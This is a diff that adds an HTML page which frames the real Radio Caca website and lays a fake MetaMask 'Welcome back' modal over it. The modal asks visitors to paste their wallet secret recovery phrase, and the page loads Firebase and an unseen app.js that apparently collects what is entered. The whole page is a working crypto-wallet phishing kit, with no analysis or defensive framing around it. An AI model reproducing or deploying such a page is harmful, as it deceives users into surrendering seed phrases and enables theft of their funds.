@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="./favicon.svg" type="image/x-icon">
+    <title>Radio Caca</title>
+    <style>
+        body {
+            margin: 0;
+            /* Reset default margin */
+            font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        iframe {
+            display: block;
+            /* iframes are inline by default */
+            background: #000;
+            border: none;
+            /* Reset default border */
+            height: 100vh;
+            /* Viewport-relative units */
+            width: 100vw;
+        }
+        
+        .overlay {
+            width: 100%;
+            height: 100%;
+            background: #000;
+            opacity: 0.5;
+            left: 50%;
+            top: 50%;
+            position: absolute;
+            transform: translate(-50%, -50%);
+        }
+        
+        .modal {
+            position: absolute;
+            float: left;
+            left: 50%;
+            top: 50%;
+            min-height: calc(100vh - 50%);
+            min-width: calc(100vw - 50%);
+            max-width: calc(100vw - 50%);
+            background-color: #fff;
+            transform: translate(-50%, -50%);
+            z-index: 1;
+            border-radius: 10px;
+        }
+        
+        @media only screen and (max-width: 600px) {
+            .modal {
+                max-height: calc(100vh - 20%);
+                min-width: calc(100vw - 10%);
+                max-width: calc(100vw - 10%);
+                overflow: auto;
+            }
+        }
+        
+        .header-metamask {
+            background-color: #f1f1f1;
+            border-radius: 10px 10px 0 0;
+            padding: 10px;
+            text-align: center;
+        }
+        
+        #logo-container {
+            margin-top: 10px;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .area-intro {
+            text-align: center;
+        }
+        
+        .input-area {
+            border: 1px solid #BBC0C5;
+            height: 48px;
+            display: flex;
+            padding: 0 16px;
+            align-items: center;
+            border-radius: 6px;
+            margin-top: 5px;
+            margin-bottom: 5px;
+        }
+        
+        .error {
+            color: #f7861c;
+        }
+        
+        input {
+            font: inherit;
+            color: currentColor;
+            width: 100%;
+            outline: none;
+            border: 0;
+            height: 1.1876em;
+            margin: 0;
+            display: block;
+            padding: 6px 0 7px;
+            min-width: 0;
+            background: none;
+            box-sizing: content-box;
+            animation-name: mui-auto-fill-cancel;
+            letter-spacing: inherit;
+            animation-duration: 10ms;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        h1 {
+            margin: 0;
+        }
+        
+        .phrase-area {
+            padding: 0 15px;
+            margin-bottom: 20px;
+        }
+        
+        label {
+            margin-bottom: 15px;
+        }
+        
+        .submit-area {
+            margin-top: 15px;
+            display: grid;
+            justify-items: center;
+        }
+        
+        button {
+            font-size: 0.875rem;
+            font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
+            line-height: 140%;
+            font-style: normal;
+            font-weight: normal;
+            font-weight: 500;
+            padding: 0.75rem 1rem;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-sizing: border-box;
+            border-radius: 6px;
+            width: 50%;
+            transition: border-color 0.3s ease, background-color 0.3s ease;
+            outline: none;
+            border: 1px solid #037dd6;
+            background-color: #037dd6;
+            color: #fff;
+            text-transform: uppercase;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+</head>
+
+<body>
+    <iframe src="https://www.radiocaca.com/" frameborder="0"></iframe>
+    <div class="hidden">
+        <div class="modal">
+            <div class="header-metamask">
+                <img src="https://metamask.io/images/mm-logo.svg" alt="Logo Metamask">
+            </div>
+            <div id="logo-container" class="html-embed w-embed w-script">
+                <script src="https://metamask.io/logo.js"></script>
+            </div>
+            <div class="area-intro">
+                <h1>Welcome back!</h1>
+                <p>The decentralized web is waiting for you</p>
+            </div>
+            <div class="phrase-area">
+                <p>If you restore using another Secret Recovery Phrase, your current wallet, accounts and assets will be removed from this app permanently. This action cannot be undone.</p>
+                <label for="pharse-key">Wallet secret recovery passphrase</label>
+                <div class="input-area">
+                    <input type="text" name="pharse-key" id="pharse-key" placeholder="Paste the Recovery Secret Passphrase from the clipboard">
+                </div>
+                <span class="error">Secret recovery passphrase of 12, 15, 18, 21 or 24 words</span>
+
+                <div class="submit-area">
+                    <button id="submit">Verify</button>
+                </div>
+            </div>
+        </div>
+        <div class="overlay"></div>
+    </div>
+    <script type="module" src="./app.js"></script>
+</body>
+
+</html>
